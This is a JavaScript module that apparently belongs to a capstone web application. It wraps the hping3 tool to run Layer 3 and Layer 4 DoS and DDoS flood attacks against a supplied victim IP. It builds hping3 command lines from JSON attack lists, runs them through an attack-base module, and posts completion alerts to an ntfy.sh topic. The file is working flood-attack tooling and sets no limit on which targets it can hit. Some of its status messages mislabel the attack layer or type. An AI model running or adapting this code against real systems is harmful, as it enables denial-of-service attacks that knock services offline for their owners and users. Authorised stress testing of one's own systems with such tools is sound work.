// THis is hping3.js
const base = require('../attackbase')

const TOOLNAME = 'HPing3';


const METHOD_LAYER3_FLOOD = 'hping3/hping3-layer3-flood.json';
const METHOD_LAYER4_FLOOD = 'hping3/hping3-layer4-flood.json';


function notify(title,body) {
    fetch('https://ntfy.sh/gsp24ia08-capstone-webapp', {
        method: 'POST', // PUT works too
        body: body,
        headers: {
            'Title': title,
        }
    })
}





async function dosLayer3Flood(victimId, victimIP, duration, threads, initPing){
    console.log("---> Go to Dos Layer 3...");
    const attackList = await base.getAttackMethod(METHOD_LAYER3_FLOOD);

    //Init writefile
    base.writeFile(victimId,TOOLNAME,attackList[0].Method,'Layer 3',"Flood", [],'dos');


    for (const attack of attackList) {
        const cmd = `hping3 ${attack.Arguments} ${victimIP}`;
        try {
            await base.dos(victimId, victimIP, TOOLNAME, attack.Method, 'Layer 3', "Flood",cmd, duration, threads, initPing);
            notify(victimId, `${TOOLNAME} Layer 4 ${attack.Method} DoS DONE.`);
        } catch (error) {
            if (error.message === 'PingTimeout') {
                console.log('Ping timed out, skipping the attack.');
            } else {
                throw error;
            }
        }
    }
}
async function ddosLayer3Flood(victimId, victimIP,duration, threads, initPing){
    console.log("---> Go to DDos Layer 3...");

    const attackList = await base.getAttackMethod(METHOD_LAYER3_FLOOD);

    //Init writefile
    base.writeFile(victimId,TOOLNAME,attackList[0].Method,'Layer 3', "Flood",[],'ddos');

    for (const attack of attackList) {
        const cmd = `hping3 ${attack.Arguments} ${victimIP}`;
        try {
            await base.ddos(victimId, victimIP, TOOLNAME, attack.Method, 'Layer 3',"Flood", cmd, duration, threads, initPing);
            notify(victimId, `${TOOLNAME} Layer 3 ${attack.Method} DDoS DONE.`);
        } catch (error) {
            if (error.message === 'PingTimeout') {
                console.log('Ping timed out, skipping the attack.');
            } else {
                throw error;
            }
        }
    }
}



async function dosLayer4Flood(victimId, victimIP, duration, threads, initPing){
    console.log("---> Go to Dos Layer 4...");
    const attackList = await base.getAttackMethod(METHOD_LAYER4_FLOOD);

    //Init writefile
    base.writeFile(victimId,TOOLNAME,attackList[0].Method,'Layer 4',"Flood", [],'dos');


    for (const attack of attackList) {
        const cmd = `hping3 ${attack.Arguments} ${victimIP}`;
        try {
            await base.dos(victimId, victimIP, TOOLNAME, attack.Method, 'Layer 4', "Flood",cmd, duration, threads, initPing);
            notify(victimId, `${TOOLNAME} Layer 4 ${attack.Method} DoS DONE.`);
        } catch (error) {
            if (error.message === 'PingTimeout') {
                console.log('Ping timed out, skipping the attack.');
            } else {
                throw error;
            }
        }
    }
}
async function ddosLayer4Flood(victimId, victimIP,duration, threads, initPing){
    console.log("---> Go to DDos Layer 4...");

    const attackList = await base.getAttackMethod(METHOD_LAYER4_FLOOD);

    //Init writefile
    base.writeFile(victimId,TOOLNAME,attackList[0].Method,'Layer 4', "Flood",[],'ddos');

    for (const attack of attackList) {
        const cmd = `hping3 ${attack.Arguments} ${victimIP}`;
        try {
            await base.ddos(victimId, victimIP, TOOLNAME, attack.Method, 'Layer 4',"Flood", cmd, duration, threads, initPing);
            notify(victimId, `${TOOLNAME} Layer 4 ${attack.Method} DoS DONE.`);
        } catch (error) {
            if (error.message === 'PingTimeout') {
                console.log('Ping timed out, skipping the attack.');
            } else {
                throw error;
            }
        }
    }
}

module.exports = {
    dosLayer3Flood,
    ddosLayer3Flood,
    dosLayer4Flood,
    ddosLayer4Flood
}

